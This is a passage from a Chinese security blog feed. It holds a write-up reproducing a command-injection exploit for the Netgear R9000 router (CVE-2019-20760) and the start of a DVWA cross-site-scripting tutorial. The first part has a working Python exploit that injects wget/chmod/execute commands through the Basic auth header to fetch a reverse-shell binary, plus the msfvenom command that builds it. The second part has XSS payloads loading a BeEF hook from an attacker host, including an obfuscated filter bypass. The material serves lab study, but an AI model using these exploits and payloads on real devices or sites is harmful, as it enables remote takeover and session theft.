<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">-M              			# 选择开发板​</span><br><span class="line">-m							# 指定内存大小</span><br><span class="line">-drive         			    # 定义存储驱动器​</span><br><span class="line">file=         			    # 定义镜像文件​</span><br><span class="line">-net nic       			    # 创建客户机网卡​</span><br><span class="line">-net tap                    # 创建 tap 设备，以桥接方式跟宿主机通信​</span><br><span class="line">ifname=virtual0             # tap 设备与名为 virtual0 的虚拟网卡进行桥接通信​</span><br><span class="line">-nographic                  # 以非图形化模式启动​</span><br><span class="line">-append        			    # 内核启动附加参数​</span><br><span class="line">-console=ttyAMA0		    # console指向串口，有此启动参数，内核启动日志才能输出到宿主机终端</span><br><span class="line">-nographic					# 不再启用额外的终端界面</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220307746.png"
                      alt="image-20231006220307746"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220609818.png"
                      alt="image-20231006220609818"
                ></p>
<p>启动 <code>qemu-system-armhf</code> 环境，默认用户名密码都为 <code>root</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.152.168/24</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006220912835.png"
                      alt="image-20231006220912835"
                ></p>
<p>为 <code>qemu-system-armhf</code> 配置静态 <code>IP</code>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">tar -cvf squashfs-root.tar.gz squashfs-root/</span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221335309.png"
                      alt="image-20231006221335309"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006221428854.png"
                      alt="image-20231006221428854"
                ></p>
<p>将文件根系统打包，然后利用 <code>python3</code> 的 <code>http.server</code> 模块下载到 <code>qemu-system-armhf</code>  的根目录中并用 <code>tar xvf squashfs-root.tar.gz </code> 解压。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /squashfs-root</span><br><span class="line">mount --bind /proc proc # proc目录是一个虚拟文件系统，可以为linux用户空间和内核空间提供交互</span><br><span class="line">mount --bind /dev dev   # /dev/下的设备是通过创建设备节点生成的，用户通过此设备节点来访问内核里的驱动</span><br><span class="line">chroot . sh</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006222713410.png"
                      alt="image-20231006222713410"
                ></p>
<p>因为 <code>chroot</code> 会导致无法在隔离的文件系统中访问原本的 <code>/proc</code>和  <code>/dev</code> 目录，这里利用 <code>mount</code> 命令将 <code>qemu-system-armhf</code>  的 <code>proc</code> 和 <code>dev</code> 目录挂在到 <code>squashfs-root</code> 中，并更换根目录为 <code>squashfs-root</code>。</p>
<h3 id="Web模拟"><a href="#Web模拟" class="headerlink" title="Web模拟"></a>Web模拟</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">find -name uhttpd</span><br><span class="line">cat ./etc/init.d/uhttpd</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./etc/init.d/uhttpd</span></span><br><span class="line">...</span><br><span class="line">start() &#123;</span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_load uhttpd</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash">config_foreach start_instance uhttpd</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">mkdir</span> /tmp/www</span></span><br><span class="line"><span class="meta prompt_">	#</span><span class="language-bash"><span class="built_in">cp</span> -rf /usr/www/* /tmp/www</span></span><br><span class="line"></span><br><span class="line">	/www/cgi-bin/uhttpd.sh start</span><br><span class="line">	inetd</span><br><span class="line">	detplc</span><br><span class="line">    #for bug58012</span><br><span class="line">    touch /tmp/fwcheck_status</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>查找 <code>uhttpd</code> 的相关文件。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">REALM=`/bin/cat /module_name | sed &#x27;s/\n//g&#x27;`</span><br><span class="line">UHTTPD_BIN=&quot;/usr/sbin/uhttpd&quot;</span><br><span class="line">PX5G_BIN=&quot;/usr/sbin/px5g&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uhttpd_stop()</span><br><span class="line">&#123;</span><br><span class="line">	kill -9 $(pidof uhttpd)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uhttpd_start()</span><br><span class="line">&#123;</span><br><span class="line">        $UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case &quot;$1&quot; in</span><br><span class="line">	stop)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">	;;</span><br><span class="line">	start)</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	restart)</span><br><span class="line">		uhttpd_stop</span><br><span class="line">		uhttpd_start</span><br><span class="line">	;;</span><br><span class="line">	*)</span><br><span class="line">		logger -- &quot;usage: $0 start|stop|restart&quot;</span><br><span class="line">	;;</span><br><span class="line">esac</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006223655990.png"
                      alt="image-20231006223655990"
                ></p>
<p>查看 <code>start()</code> 函数中利用的 <code>/www/cgi-bin/uhttpd.sh</code> 脚本。发现启动命令为 <code>$UHTTPD_BIN -h /www -r $&#123;REALM&#125;  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443</code> 其中 <code>REALM = R9000</code> ，<code>UHTTPD_BIN = /usr/sbin/uhttpd</code>。我们无需开启 <code>https</code>，所以启动命令为 <code>/usr/sbin/uhttpd -h /www -r R9000 -x /cgi-bin -t 70 -p 0.0.0.0:80</code>。</p>
<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.28.zip</span><br></pre></td></tr></table></figure></div>

<p>获取修复版本的固件。因为源码较为繁杂，我们通过 <code>Bindiff</code> 进行二进制比对，来查找漏洞点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006231411605.png"
                      alt="image-20231006231411605"
                ></p>
<p><code>shift+D</code> 选取修复版本的 <code>/usr/sbin/uhttpd</code> 文件即可，主要查看登录验证的 <code>uh_cgi_auth_check()</code> 函数。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v14 = <span class="built_in">strlen</span>(v13);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">0xFFF</span>, v13 + <span class="number">6</span>, v14 - <span class="number">6</span>);</span><br><span class="line">  v15 = <span class="built_in">strchr</span>(s, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v15 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_32:</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = v15 + <span class="number">1</span>;</span><br><span class="line">  *v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v15 != (<span class="type">char</span> *)<span class="number">0xFFFFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">snprintf</span>(command, <span class="number">0x80</span>u, <span class="string">&quot;/usr/sbin/hash-data -e %s &gt;/tmp/hash_result&quot;</span>, v15 + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">system</span>(command);</span><br><span class="line">    v3 = <span class="built_in">cat_file</span>(<span class="number">73805</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = s</span><br></pre></td></tr></table></figure></div>

<p>漏洞版本 <code>base64</code> 解密后 <code>snprintf()</code> 后直接传给 <code>system()</code> 执行，这里会把 <code>v15(:)</code>后面的内容放到 <code>%s</code> 处，记得加<code>\n</code>来执行多条指令。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">  v15 = <span class="built_in">strlen</span>(v14);</span><br><span class="line">  <span class="built_in">uh_b64decode</span>(s, <span class="number">4095</span>, v14 + <span class="number">6</span>, v15 - <span class="number">6</span>);</span><br><span class="line">  v16 = <span class="built_in">strchr</span>(s, <span class="number">58</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v16 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_15:</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    v18 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line">  v17 = v16 + <span class="number">1</span>;</span><br><span class="line">  *v16 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != (<span class="type">char</span> *)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = s;</span><br><span class="line">    <span class="built_in">dni_system</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;/usr/sbin/hash-data&quot;</span>, <span class="string">&quot;-e&quot;</span>, v17, <span class="number">0</span>);</span><br><span class="line">    v19 = <span class="built_in">cat_file</span>(<span class="string">&quot;/tmp/hash_result&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>而修复版本则利用 <code>dni_system()</code> 执行，只可控参数。</p>
<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><p>poc:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd  = <span class="string">&#x27;admin:&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;wget http://192.168.152.167:8000/shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;chmod 777 ./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;./shell.elf\n&#x27;</span></span><br><span class="line">cmd += <span class="string">&#x27;`&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(cmd) &lt; <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">cmd_b64 = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic &quot;</span> + cmd_b64</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        requests.get(<span class="string">&quot;http://192.168.152.168/cgi-bin/&quot;</span>, headers=headers, timeout=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">attack()</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.152.167 LPORT=10086 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></div>

<p>利用 <code>msf</code> 生成对应架构的木马程序，然后在<code>shell.elf</code>所在的目录开启<code>http</code>服务，利用漏洞将木马程序下载下来。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006233741185.png"
                      alt="image-20231006233741185"
                ></p>
<p>启动监听，并执行 <code>exp.py</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234357194.png"
                      alt="image-20231006234357194"
                ></p>
<p>成功获取 <code>shell</code>，我们利用获取的权限在 <code>www</code> 目录创建 <code>flag.txt</code> 文件然后访问它。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/05/Netgear-CVE-2019-20760/image-20231006234709504.png"
                      alt="image-20231006234709504"
                ></p>
<p>成功创建。</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT-CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-XSS跨站脚本攻击</title>
    <url>/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS 指 Web 应用代码注入，攻击者向 Web 页面插入恶意 Script 代码，例如 JavaScript 脚本，CSS 或者其他代码。用户浏览该页面会执行其中嵌入的 Script 代码，从而获取 cookie，session，token或其他敏感信息，对用户进行钓鱼欺诈。</p>
<h2 id="XSS-基础"><a href="#XSS-基础" class="headerlink" title="XSS 基础"></a>XSS 基础</h2><h3 id="反射型-XSS（非持久性-XSS）"><a href="#反射型-XSS（非持久性-XSS）" class="headerlink" title="反射型 XSS（非持久性 XSS）"></a>反射型 XSS（非持久性 XSS）</h3><p>这种 XSS 并没有保存到目标网站，而是将将恶意代码放在请求的响应结果中，浏览器解析后触发 XSS，一般引诱用户点击恶意链接来实施攻击。</p>
<h5 id="dvwa-例题"><a href="#dvwa-例题" class="headerlink" title="dvwa 例题:"></a>dvwa 例题:</h5><p><strong>level: Low</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>向 GET 请求注入代码:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211545402.png"
                      alt="image-20230926211545402"
                ></p>
<p>反馈:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211722779.png"
                      alt="image-20230926211722779"
                ></p>
<p>BeEF 利用:</p>
<p>攻击方 <code>IP: 192.168.152.128</code>。</p>
<p>靶场<code>IP: 192.168.152.1</code></p>
<p>键入<code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145547349.png"
                      alt="image-20230927145547349"
                ></p>
<p>反馈:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145700059.png"
                      alt="image-20230927145700059"
                ></p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22http%3A%2F%2F192.168.152.128%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E#</code></p>
<p>变成了  hook.js地址，并且成功上线 BeEF，可通过Get cookie 获取 cookie信息。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145747630.png"
                      alt="image-20230927145747630"
                ></p>
<p>界面跳转。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160822193.png"
                      alt="image-20230927160822193"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160901116.png"
                      alt="image-20230927160901116"
                ></p>
<p>弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161904804.png"
                      alt="image-20230927161904804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161847107.png"
                      alt="image-20230927161847107"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );//str_replace 区分大小写。</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>payload:</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927165007670.png"
                      alt="image-20230927165007670"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // 避开&lt;script ,*贪婪匹配会匹配到 &lt;</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>只要避免 <code>script</code>出现即可。</p>
<p>策略: 使用<code>String.fromCharCode()</code>函数来创建<code>&quot;script&quot;</code>和<code>&quot;http://192.168.152.128:3000/hook.js&quot;</code>这两个字符串，以避免直接在代码中出现这些字符串。然后，我使用<code>eval()</code>函数来执行这段代码。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171112316.png"
                      alt="image-20230927171112316"
                ></p>
<p> 成功上线BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171209443.png"
                      alt="image-20230927171209443"
                ></p>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>存储型 XSS 被保留在目标网站中，受害者浏览包含此恶意代码的网站就会执行恶意代码。通常出现在个人信息，网站留言，评论，博客日志等交互处。</p>
<h5 id="dvwa-例题-1"><a href="#dvwa-例题-1" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = stripslashes( $message );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>在留言板键入 <code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163730628.png"
                      alt="image-20230927163730628"
                ></p>
<p>成功上线BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163814502.png"
                      alt="image-20230927163814502"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? 